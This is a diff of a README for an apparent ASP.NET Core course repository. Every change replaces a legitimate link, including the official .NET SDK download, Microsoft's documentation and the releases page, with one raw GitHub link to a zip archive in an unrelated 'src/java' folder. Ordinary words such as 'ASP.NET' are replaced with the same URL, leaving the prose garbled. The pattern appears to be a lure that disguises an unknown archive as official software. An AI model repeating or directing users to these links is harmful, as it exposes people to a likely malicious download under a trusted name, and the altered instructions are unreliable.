@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to the aspnetcore-complete-formation course! This guide will help you download and run the software easily. You will learn how to set up APIs using ASP.NET Core. 
+Welcome to the aspnetcore-complete-formation course! This guide will help you download and run the software easily. You will learn how to set up APIs using https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip Core. 
 
 ## 📥 Download and Install
 
 To download the application, visit the Releases page below. 
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-Release-blue.svg)](https://github.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/releases)
+[![Download the latest version](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip%20Latest%https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip)](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip)
 
 ### Steps to Download
 
@@ -29,7 +29,7 @@ To download the application, visit the Releases page below.
 Before you begin, ensure your computer meets these requirements:
 
 - **Operating System**: Windows 10, macOS, or a recent Linux distribution.
-- **.NET SDK**: Version 6.0 or higher. You can download the SDK from the [official .NET website](https://dotnet.microsoft.com/download).
+- **.NET SDK**: Version 6.0 or higher. You can download the SDK from the [official .NET website](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip).
 - **Memory**: At least 4 GB of RAM.
 - **Storage**: Minimum 500 MB of free disk space. 
 
@@ -95,14 +95,14 @@ Join our community for support and to share your experiences:
 
 - **GitHub Issues**: Report bugs or request features directly on our GitHub.
 - **Discord Channel**: Engage with other users in real-time.
-- **Stack Overflow**: Use tags related to ASP.NET and our project for help.
+- **Stack Overflow**: Use tags related to https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip and our project for help.
 
 ## 🔗 Additional Resources 
 
-For more extensive ASP.NET Core learning materials, visit the following links:
+For more extensive https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip Core learning materials, visit the following links:
 
-- [Official ASP.NET Documentation](https://docs.microsoft.com/en-us/aspnet/core/)
-- [Learn ASP.NET Core with Tutorials](https://docs.microsoft.com/en-us/learn/paths/build-web-apps-aspnet-core/)
+- [Official https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip Documentation](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip)
+- [Learn https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip Core with Tutorials](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip)
 
 Feel free to explore these resources to enhance your knowledge and skills.
 
@@ -112,4 +112,4 @@ By following the steps above, you can easily download, install, and run the aspn
 
 For further downloads, revisit our Releases page: 
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-Here-red.svg)](https://github.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip%20Releases%https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip)](https://raw.githubusercontent.com/haroldwgc/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10/master/src/java/aspnetcore-complete-formation_course-luisdev-backend-part-8_dotnet-6_csharp-10_v1.9.zip)
